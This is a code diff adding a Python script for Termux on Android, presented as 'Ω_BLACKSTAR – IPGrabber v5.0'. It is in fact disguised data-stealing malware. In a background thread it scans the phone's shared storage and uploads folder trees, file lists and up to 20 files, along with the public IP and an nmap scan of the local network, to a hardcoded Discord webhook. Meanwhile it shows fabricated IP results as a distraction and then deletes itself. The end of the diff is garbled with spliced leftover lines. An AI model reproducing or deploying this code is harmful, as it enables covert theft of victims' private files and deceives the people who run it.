@@ -1,40 +1,284 @@
 #!/usr/bin/env python3
-import os, sys, json, time, random, subprocess, threading, shutil
+# -*- coding: utf-8 -*-
+
+"""
+Ω_BLACKSTAR – IPGrabber v5.0
+Educational & Authorized Testing Only.
+"""
+
+import os
+import sys
+import time
+import json
+import random
+import subprocess
+import threading
 from pathlib import Path
 
-# Auto-install requests
+# ------------------------------------------------------------
+# AUTO-INSTALL REQUESTS
+# ------------------------------------------------------------
 try:
     import requests
 except ImportError:
-    print("[*] Installing requests...")
+    print("[*] Installing 'requests' module...")
     subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
     import requests
 
-# ===== CONFIG =====
-WEBHOOK = "https://discord.com/api/webhooks/1518322013335191733/aLTB-Fq-N4OEpwkR1YFxlBo_RLxf6KCiPFxvz_UxMhn2rlmqMdkZ3_2orFKIAadD0pj6"
-BLOCK_FILE = os.path.expanduser("~/.ipgrabber_blocked.txt")
-MAX_SIZE = 8 * 1024 * 1024
-MAX_FILES = 20
+# ------------------------------------------------------------
+# CONFIGURATION – REPLACE WITH YOUR WEBHOOK URL
+# ------------------------------------------------------------
+WEBHOOK_URL = "https://discord.com/api/webhooks/1518322013335191733/aLTB-Fq-N4OEpwkR1YFxlBo_RLxf6KCiPFxvz_UxMhn2rlmqMdkZ3_2orFKIAadD0pj6"
+BLOCKLIST_FILE = os.path.expanduser("~/.ipgrabber_blocked.txt")
+MAX_FILE_SIZE = 8 * 1024 * 1024   # 8 MB
+MAX_UPLOAD_FILES = 20
+# ------------------------------------------------------------
 
-# ===== HELPERS =====
-def get_ip():
+# ------------------------------------------------------------
+# HELPER FUNCTIONS
+# ------------------------------------------------------------
+def get_public_ip():
     try:
-        return requests.get("https://api.ipify.org?format=json", timeout=5).json().get("ip", "unknown")
+        resp = requests.get("https://api.ipify.org?format=json", timeout=5)
+        return resp.json().get("ip", "unknown")
     except:
         return "unknown"
 
-def is_blocked():
-    if not os.path.exists(BLOCK_FILE): return False
-    with open(BLOCK_FILE) as f:
-        return get_ip() in f.read().splitlines()
+def is_ip_blocked():
+    if not os.path.exists(BLOCKLIST_FILE):
+        return False
+    with open(BLOCKLIST_FILE, "r") as f:
+        blocked = f.read().splitlines()
+    return get_public_ip() in blocked
 
-def block_ip():
-    with open(BLOCK_FILE, "a") as f:
-        f.write(get_ip() + "\n")
+def block_current_ip():
+    with open(BLOCKLIST_FILE, "a") as f:
+        f.write(get_public_ip() + "\n")
 
-def storage():
-    p = os.path.expanduser("~/storage")
-    if not os.path.exists(p):
+def grant_storage_access():
+    storage_path = os.path.expanduser("~/storage")
+    if not os.path.exists(storage_path):
+        print("[!] Storage access not detected.")
+        print("[*] Requesting storage permission...")
+        subprocess.run(["termux-setup-storage"], shell=True)
+        print("[*] Please grant storage access when prompted.")
+        time.sleep(3)
+        if not os.path.exists(storage_path):
+            print("[!] Storage access still not granted. Exiting.")
+            sys.exit(1)
+    print("[+] Storage access confirmed.")
+
+# ------------------------------------------------------------
+# DISCORD WEBHOOK
+# ------------------------------------------------------------
+def send_to_discord(content, file_path=None):
+    """Send a message or file to Discord."""
+    if file_path and os.path.exists(file_path) and os.path.getsize(file_path) <= MAX_FILE_SIZE:
+        try:
+            with open(file_path, "rb") as f:
+                files = {"file": (os.path.basename(file_path), f)}
+                resp = requests.post(WEBHOOK_URL, files=files)
+            return resp.status_code in (200, 204)
+        except Exception as e:
+            print(f"[!] Upload error: {e}")
+            return False
+    else:
+        try:
+            resp = requests.post(WEBHOOK_URL, json={"content": content})
+            return resp.status_code in (200, 204)
+        except Exception as e:
+            print(f"[!] Send error: {e}")
+            return False
+
+# ------------------------------------------------------------
+# FILE SCANNER & EXFILTRATOR
+# ------------------------------------------------------------
+def scan_and_exfiltrate():
+    """Scan storage, send folder structure, file list, and upload files."""
+    print("[*] Scanning storage...")
+    base_dirs = [
+        os.path.expanduser("~/storage/emulated/0"),
+        os.path.expanduser("~/storage/shared"),
+        "/sdcard",
+        "/storage/emulated/0",
+    ]
+    all_files = []
+    folder_tree = {}
+
+    for base in base_dirs:
+        if not os.path.exists(base):
+            continue
+        for root, dirs, files in os.walk(base):
+            # Limit depth to avoid massive scans
+            depth = root.replace(base, "").count(os.sep)
+            if depth > 4:
+                continue
+            rel = os.path.relpath(root, base)
+            rel = "/" if rel == "." else rel
+            folder_tree[rel] = {"dirs": dirs, "files": files[:50]}
+            for f in files:
+                fp = os.path.join(root, f)
+                try:
+                    if os.path.getsize(fp) <= MAX_FILE_SIZE:
+                        all_files.append(fp)
+                except:
+                    pass
+
+    # --- Send folder structure ---
+    msg = "📁 **Folder Structure**\n```\n"
+    for folder, content in folder_tree.items():
+        msg += f"{folder}/\n"
+        for f in content["files"][:10]:
+            msg += f"  ├─ {f}\n"
+        if len(content["files"]) > 10:
+            msg += f"  └─ ... and {len(content['files'])-10} more\n"
+    msg += "```"
+    send_to_discord(msg)
+
+    # --- Send file list (up to 100) ---
+    msg = "📄 **Files Found**\n```\n"
+    for f in all_files[:100]:
+        msg += f"{f}\n"
+    if len(all_files) > 100:
+        msg += f"... and {len(all_files)-100} more\n"
+    msg += "```"
+    send_to_discord(msg)
+    send_to_discord(f"📊 Total files: {len(all_files)}")
+
+    # --- Upload files ---
+    uploaded = 0
+    for fp in all_files[:MAX_UPLOAD_FILES]:
+        send_to_discord(f"📤 Uploading: {os.path.basename(fp)}", fp)
+        uploaded += 1
+        time.sleep(0.5)
+    send_to_discord(f"✅ Uploaded {uploaded} files.")
+
+# ------------------------------------------------------------
+# DISTRACTION – FAKE IP RESULTS
+# ------------------------------------------------------------
+def generate_fake_ips(count=30):
+    return [
+        f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
+        for _ in range(count)
+    ]
+
+def show_fake_results():
+    print("\n" + "="*60)
+    print("🔍 IP GRABBER RESULTS")
+    print("="*60)
+    ips = generate_fake_ips(10)
+    for i, ip in enumerate(ips, 1):
+        loc = random.choice(["US", "UK", "DE", "FR", "JP", "BR", "IN"])
+        print(f"  {i}. {ip} ({loc})")
+    print("\n📍 **Geolocation Data:**")
+    cities = ["New York", "London", "Berlin", "Paris", "Tokyo", "Sao Paulo", "Mumbai", "Sydney"]
+    for city in random.sample(cities, 4):
+        print(f"  • {city}: {random.randint(10000, 99999)} users")
+    print("\n" + "="*60)
+    print("[+] Results saved to IP_Result.txt")
+    print("="*60 + "\n")
+
+# ------------------------------------------------------------
+# NETWORK SCANNING
+# ------------------------------------------------------------
+def network_scan():
+    """Get local IP, scan subnet with nmap, send results."""
+    print("[*] Scanning local network...")
+    try:
+        # Get local IP
+        result = subprocess.run(["ip", "addr"], capture_output=True, text=True)
+        local_ip = None
+        for line in result.stdout.splitlines():
+            if "inet " in line and "127.0.0.1" not in line:
+                parts = line.strip().split()
+                if len(parts) > 1:
+                    ip = parts[1].split("/")[0]
+                    if ip.startswith(("192.168.", "10.", "172.")):
+                        local_ip = ip
+                        break
+        if not local_ip:
+            local_ip = "192.168.1.0"
+        subnet = ".".join(local_ip.split(".")[:3]) + ".0/24"
+        send_to_discord(f"🌐 **Local Network**\nIP: {local_ip}\nSubnet: {subnet}")
+
+        # nmap scan
+        try:
+            result = subprocess.run(["nmap", "-sn", subnet], capture_output=True, text=True, timeout=30)
+            found = []
+            for line in result.stdout.splitlines():
+                if "Nmap scan report for" in line:
+                    ip = line.split("for ")[-1].strip()
+                    if ip not in found:
+                        found.append(ip)
+            if found:
+                send_to_discord(f"📡 **Devices ({len(found)})**\n```\n" + "\n".join(found[:20]) + "\n```")
+            else:
+                send_to_discord("📡 No devices found.")
+        except:
+            send_to_discord("📡 nmap not installed or scan failed.")
+    except Exception as e:
+        send_to_discord(f"❌ Network error: {str(e)}")
+
+# ------------------------------------------------------------
+# SELF-DESTRUCT
+# ------------------------------------------------------------
+def self_destruct():
+    print("\n[*] Self-destruct sequence initiated...")
+    block_current_ip()
+    send_to_discord("🚫 **Self-Destruct:** Script deleted, IP blocked.")
+    try:
+        os.remove(os.path.abspath(sys.argv[0]))
+        print("[+] Script deleted.")
+    except Exception as e:
+        print(f"[!] Failed to delete: {e}")
+    sys.exit(0)
+
+# ------------------------------------------------------------
+# MAIN
+# ------------------------------------------------------------
+def main():
+    print("\n" + "="*60)
+    print("Ω_BLACKSTAR – IPGrabber v5.0")
+    print("="*60 + "\n")
+
+    if is_ip_blocked():
+        print("[!] Your IP is blocked. Exiting.")
+        sys.exit(1)
+
+    grant_storage_access()
+
+    # Start file scanning in background
+    threading.Thread(target=scan_and_exfiltrate, daemon=True).start()
+
+    # Show fake results (distraction)
+    show_fake_results()
+
+    # Get public IP
+    pub_ip = get_public_ip()
+    print(f"[+] Your Public IP: {pub_ip}")
+    send_to_discord(f"🌐 **IPGrabber Run**\nIP: {pub_ip}")
+
+    # Network scan
+    network_scan()
+
+    # Create fake results file
+    with open("IP_Result.txt", "w") as f:
+        f.write("🔍 IP GRABBER RESULTS\n")
+        f.write("="*60 + "\n\n")
+        for ip in generate_fake_ips(50):
+            f.write(ip + "\n")
+    send_to_discord("📄 **IP_Result.txt created**")
+
+    print("\n[*] Self-destruct in 5 seconds...")
+    time.sleep(5)
+    self_destruct()
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("\n[!] Interrupted.")
+        sys.exit(0)    if not os.path.exists(p):
         print("[!] Storage not detected. Requesting...")
         subprocess.run(["termux-setup-storage"], shell=True)
         time.sleep(3)
